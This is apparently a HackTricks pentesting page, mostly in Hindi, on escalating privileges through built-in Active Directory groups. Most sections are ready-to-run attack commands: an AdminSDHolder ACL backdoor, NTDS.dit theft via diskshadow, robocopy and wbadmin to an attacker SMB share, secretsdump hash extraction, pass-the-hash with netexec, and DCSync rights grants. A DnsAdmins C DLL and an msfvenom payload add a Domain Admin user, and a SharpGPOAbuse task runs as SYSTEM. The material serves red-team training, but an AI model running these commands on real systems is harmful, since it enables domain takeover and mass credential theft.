# विशेषाधिकार प्राप्त समूह

{{#include ../../banners/hacktricks-training.md}}

## प्रशासनिक विशेषाधिकारों वाले जाने-माने समूह

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

यह समूह डोमेन पर व्यवस्थापक न होने वाले खाते और समूह बनाने का अधिकार रखता है। साथ ही यह Domain Controller (DC) पर स्थानीय लॉगिन की अनुमति देता है।

इस समूह के सदस्यों की पहचान करने के लिए, निम्नलिखित कमांड चलाई जाती है:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Adding new users is permitted, as well as local login to the DC.

## AdminSDHolder समूह

**AdminSDHolder** समूह की Access Control List (ACL) महत्वपूर्ण है क्योंकि यह Active Directory के भीतर सभी "protected groups", विशेष रूप से high-privilege groups के लिए अनुमतियाँ निर्धारित करती है। यह तंत्र इन समूहों की सुरक्षा सुनिश्चित करता है और अनधिकृत संशोधनों को रोकता है।

एक attacker इसका फायदा उठाकर **AdminSDHolder** समूह की ACL बदल सकता है और एक standard user को पूर्ण अनुमतियाँ दे सकता है। इससे वह user प्रभावी रूप से सभी protected groups पर पूर्ण नियंत्रण प्राप्त कर लेगा। यदि उस user की अनुमतियाँ बदली या हटाई जाती हैं, तो सिस्टम की डिज़ाइन के कारण उन्हें लगभग एक घंटे के भीतर स्वतः पुनर्स्थापित कर दिया जाएगा।

Recent Windows Server documentation कुछ built-in operator groups को अभी भी **protected** objects के रूप में मानती है (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, आदि)। **SDProp** process डिफ़ॉल्ट रूप से हर 60 मिनट पर **PDC Emulator** पर चलता है, `adminCount=1` सेट करता है, और protected objects पर inheritance को disable कर देता है। यह persistence के लिए उपयोगी है और उन stale privileged users को खोजने में भी मदद करता है जो किसी protected group से हटाए गए थे पर non-inheriting ACL अभी भी रखते हैं।

सदस्यों की समीक्षा करने और अनुमतियाँ बदलने के लिए कमांड शामिल हैं:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

अधिक जानकारी के लिए देखें [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

इस समूह की सदस्यता हटाए गए Active Directory ऑब्जेक्ट्स को पढ़ने की अनुमति देती है, जो संवेदनशील जानकारी उजागर कर सकती है:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
यह **पिछले विशेषाधिकार पथों की पुनर्प्राप्ति** के लिए उपयोगी है। हटाए गए ऑब्जेक्ट अभी भी `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, पुराने SPNs, या किसी हटाए गए विशेषाधिकार समूह के DN को उजागर कर सकते हैं, जिसे बाद में किसी अन्य ऑपरेटर द्वारा पुनर्स्थापित किया जा सकता है।
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller Access

DC पर फाइलों तक पहुँच प्रतिबंधित होती है जब तक कि उपयोगकर्ता `Server Operators` समूह का हिस्सा न हो, जो पहुँच के स्तर को बदल देता है।

### Privilege Escalation

`PsService` या `sc` (Sysinternals से) का उपयोग करके, कोई सेवा अनुमतियों की जाँच और संशोधन कर सकता है। उदाहरण के लिए, `Server Operators` समूह कुछ सेवाओं पर पूर्ण नियंत्रण रखता है, जिससे किसी भी कमांड का निष्पादन और privilege escalation की अनुमति मिलती है:
```cmd
C:\> .\PsService.exe security AppReadiness
```
यह कमांड दिखाती है कि `Server Operators` को पूर्ण पहुंच है, जिससे सेवाओं में हेरफेर करके उच्चाधिकार प्राप्त करना संभव होता है।

## Backup Operators

`Backup Operators` समूह की सदस्यता `DC01` फ़ाइल सिस्टम तक पहुंच देती है, क्योंकि इसमें `SeBackup` और `SeRestore` अधिकार होते हैं। ये अधिकार `FILE_FLAG_BACKUP_SEMANTICS` फ़्लैग का उपयोग करके, स्पष्ट अनुमतियों के बिना भी फ़ोल्डर traversal, listing, और फ़ाइल कॉपी करने की क्षमताएँ सक्षम करते हैं। इस प्रक्रिया के लिए विशिष्ट स्क्रिप्ट्स का उपयोग आवश्यक है।

समूह के सदस्यों की सूची देखने के लिए, चलाएँ:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### स्थानीय हमला

स्थानीय रूप से इन अधिकारों का लाभ उठाने के लिए, निम्नलिखित चरण अपनाए जाते हैं:

1. आवश्यक लाइब्रेरी आयात करें:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. सक्षम करें और सत्यापित करें `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. प्रतिबंधित निर्देशिकाओं से फ़ाइलों तक पहुँचें और उन्हें कॉपी करें, उदाहरण के लिए:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller के फ़ाइल सिस्टम तक सीधी पहुँच `NTDS.dit` डेटाबेस की चोरी की अनुमति देती है, जिसमें डोमेन उपयोगकर्ताओं और कंप्यूटरों के सभी NTLM hashes होते हैं।

#### diskshadow.exe का उपयोग

1. `C` ड्राइव की शैडो कॉपी बनाएं:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. शैडो कॉपी से `NTDS.dit` कॉपी करें:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
वैकल्पिक रूप से, फाइल कॉपी करने के लिए `robocopy` का उपयोग करें:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. हैश पुनर्प्राप्ति के लिए `SYSTEM` और `SAM` निकालें:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` से सभी हैश प्राप्त करें:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. निकासी के बाद: Pass-the-Hash to DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe का उपयोग

1. आक्रमणकर्ता मशीन पर SMB सर्वर के लिए NTFS फ़ाइल सिस्टम सेट करें और लक्ष्य मशीन पर SMB credentials कैश करें।
2. सिस्टम बैकअप और `NTDS.dit` निकालने के लिए `wbadmin.exe` का उपयोग करें:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** समूह के सदस्य अपने अधिकारों का दुरुपयोग कर सकते हैं ताकि अक्सर Domain Controllers पर होस्ट किए गए DNS सर्वर पर SYSTEM privileges के साथ किसी भी DLL को लोड किया जा सके। यह क्षमता महत्वपूर्ण शोषण संभावनाएँ प्रदान करती है।

DnsAdmins समूह के सदस्यों की सूची देखने के लिए, उपयोग करें:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> यह भेद्यता DNS सेवा (आमतौर पर DCs के भीतर) में SYSTEM privileges के साथ arbitrary code को चलाने की अनुमति देती है। यह समस्या 2021 में ठीक कर दी गई थी।

सदस्य DNS सर्वर को कोई भी DLL लोड करने के लिए बाध्य कर सकते हैं (स्थानीय रूप से या किसी remote share से) निम्नलिखित जैसे कमांड का उपयोग करके:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS सेवा को पुनरारंभ करना (जिसके लिए अतिरिक्त अनुमतियाँ आवश्यक हो सकती हैं) DLL को लोड करने के लिए आवश्यक है:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

कमान्ड निष्पादन के लिए mimilib.dll का उपयोग करना भी संभव है, इसे विशिष्ट कमांड या reverse shells चलाने के लिए संशोधित करके। [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD Record for MitM

DnsAdmins DNS records को manipulate करके, global query block list को disable करने के बाद WPAD record बनाकर Man-in-the-Middle (MitM) attacks कर सकते हैं। Responder या Inveigh जैसे tools spoofing और capturing network traffic के लिए उपयोग किए जा सकते हैं।

### Event Log Readers
Members event logs तक पहुँच सकते हैं, संभावित रूप से plaintext passwords या command execution details जैसी संवेदनशील जानकारी पा सकते हैं:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows अनुमतियाँ

यह समूह domain object पर DACLs को संशोधित कर सकता है, जो संभावित रूप से DCSync अधिकार प्रदान कर सकता है। इस समूह का उपयोग करके privilege escalation की तकनीकें Exchange-AD-Privesc GitHub repo में विस्तृत हैं।
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
यदि आप इस समूह के सदस्य के रूप में कार्य कर सकते हैं, तो क्लासिक दुरुपयोग यह है कि attacker-controlled principal को [DCSync](dcsync.md) के लिए आवश्यक replication rights दिए जाएँ:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** chained mailbox access, coerced Exchange authentication, and LDAP relay to land on this same primitive. Even where that relay path is mitigated, direct membership in `Exchange Windows Permissions` or control of an Exchange server remains a high-value route to domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators को Hyper-V का पूरा एक्सेस होता है, जिसे exploit करके virtualized Domain Controllers पर नियंत्रण हासिल किया जा सकता है। इसमें live DCs को क्लोन करना और NTDS.dit फ़ाइल से NTLM hashes निकालना शामिल है।

### Exploitation Example

व्यावहारिक दुरुपयोग आम तौर पर पुराने host-level LPE tricks की बजाय **offline access to DC disks/checkpoints** होता है। Hyper-V host तक पहुँच होने पर, एक operator virtualized Domain Controller का checkpoint ले या export कर सकता है, VHDX को mount कर सकता है, और guest के भीतर LSASS को छुए बिना `NTDS.dit`, `SYSTEM`, तथा अन्य secrets निकाल सकता है:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
उसके बाद, `Backup Operators` workflow का पुन: उपयोग कर `Windows\NTDS\ntds.dit` और registry hives को offline कॉपी करें।

## Group Policy Creators Owners

यह समूह सदस्यों को domain में Group Policies बनाने की अनुमति देता है। हालांकि, इसके सदस्य users या groups पर Group Policies apply नहीं कर सकते और न ही मौजूदा GPOs को edit कर सकते हैं।

महत्वपूर्ण बात यह है कि **creator नए GPO का owner बन जाता है** और आमतौर पर बाद में इसे edit करने के लिए पर्याप्त rights प्राप्त कर लेता है। इसका अर्थ है कि यह समूह तब रोचक हो जाता है जब आप या तो:

- एक malicious GPO बनाएँ और एक admin को मनाएँ कि वह इसे target OU/domain से link कर दे
- उस GPO को edit करें जिसे आपने बनाया था और जो पहले से किसी उपयोगी जगह पर linked है
- किसी अन्य delegated right का दुरुपयोग करें जो आपको GPOs link करने देता है, जबकि यह समूह आपको edit करने का हिस्सा देता है

व्यवहारिक दुरुपयोग आमतौर पर SYSVOL-backed policy files के माध्यम से एक **Immediate Task**, **startup script**, **local admin membership**, या **user rights assignment** परिवर्तन जोड़ने का अर्थ रखता है।
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
यदि आप GPO को `SYSVOL` के माध्यम से मैन्युअली संपादित करते हैं, तो याद रखें कि यह परिवर्तन अपने आप पर्याप्त नहीं है: `versionNumber`, `GPT.ini`, और कभी-कभी `gPCMachineExtensionNames` को भी अपडेट करना जरूरी है, वरना क्लाइंट्स पॉलिसी रिफ्रेश को अनदेखा कर देंगे।

## Organization Management

ऐसे वातावरणों में जहाँ **Microsoft Exchange** तैनात है, एक विशेष समूह जिसे **Organization Management** कहा जाता है, महत्वपूर्ण क्षमताएँ रखता है। इस समूह को **सभी डोमेन उपयोगकर्ताओं के मेलबॉक्स तक पहुँच** का अधिकार है और यह 'Microsoft Exchange Security Groups' Organizational Unit (OU) पर **पूर्ण नियंत्रण** रखता है। इस नियंत्रण में **`Exchange Windows Permissions`** समूह शामिल है, जिसका उपयोग privilege escalation के लिए किया जा सकता है।

### Privilege का शोषण और कमांड्स

#### Print Operators

**Print Operators** समूह के सदस्यों को कई privileges दिए जाते हैं, जिनमें **`SeLoadDriverPrivilege`** भी शामिल है, जो उन्हें एक Domain Controller पर लोकली लॉग ऑन करने, उसे शटडाउन करने, और प्रिंटर्स को मैनेज करने की अनुमति देता है। इन privileges का शोषण करने के लिए, खासकर यदि **`SeLoadDriverPrivilege`** अनएलेवेटेड context में दिखाई नहीं देता, तो User Account Control (UAC) को बायपास करना आवश्यक होता है।

इस समूह के सदस्यों की सूची देखने के लिए, निम्न PowerShell कमांड का उपयोग किया जाता है:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
डोमेन कंट्रोलरों पर यह समूह खतरनाक है क्योंकि डिफ़ॉल्ट Domain Controller Policy `Print Operators` को **`SeLoadDriverPrivilege`** प्रदान करती है। यदि आप इस समूह के किसी सदस्य के लिए elevated token प्राप्त कर लेते हैं, तो आप इस privilege को सक्षम कर सकते हैं और एक signed-but-vulnerable ड्राइवर लोड करके kernel/SYSTEM पर पहुँच सकते हैं। token handling के विवरण के लिए, [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) देखें।

#### Remote Desktop Users

इस समूह के सदस्यों को Remote Desktop Protocol (RDP) के माध्यम से PCs तक पहुँच की अनुमति दी जाती है। इन सदस्यों की सूची प्राप्त करने के लिए PowerShell कमांड्स उपलब्ध हैं:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP का शोषण करने के बारे में आगे की जानकारी समर्पित pentesting संसाधनों में मिल सकती है।

#### रिमोट प्रबंधन उपयोगकर्ता

सदस्य **Windows Remote Management (WinRM)** के माध्यम से PCs तक पहुँच सकते हैं। इन सदस्यों की enumeration निम्नलिखित के माध्यम से की जाती है:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
WinRM से संबंधित exploitation techniques के लिए, विशिष्ट दस्तावेज़ देखें।

#### Server Operators

यह समूह Domain Controllers पर विभिन्न कॉन्फ़िगरेशन करने की अनुमति रखता है, जिनमें backup और restore privileges, सिस्टम समय बदलना, और सिस्टम को shutdown करना शामिल है। सदस्यों की सूची प्राप्त करने के लिए दिया गया command है:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Domain Controllers पर, `Server Operators` आम तौर पर पर्याप्त अधिकार विरासत में पाते हैं ताकि वे **reconfigure or start/stop services** कर सकें और default DC policy के माध्यम से `SeBackupPrivilege`/`SeRestorePrivilege` भी प्राप्त करते हैं। व्यवहार में, यह उन्हें **service-control abuse** और **NTDS extraction** के बीच एक सेतु बना देता है:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
यदि किसी service की ACL इस group को परिवर्तन/स्टार्ट करने के अधिकार देती है, तो service को किसी भी arbitrary कमांड की ओर निर्देश करें, उसे `LocalSystem` के रूप में चलाएँ, और फिर मूल `binPath` को बहाल करें। यदि service control लॉकडाउन है, तो ऊपर बताए गए `Backup Operators` तरीकों पर लौटें और `NTDS.dit` को कॉपी करें।

## संदर्भ <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
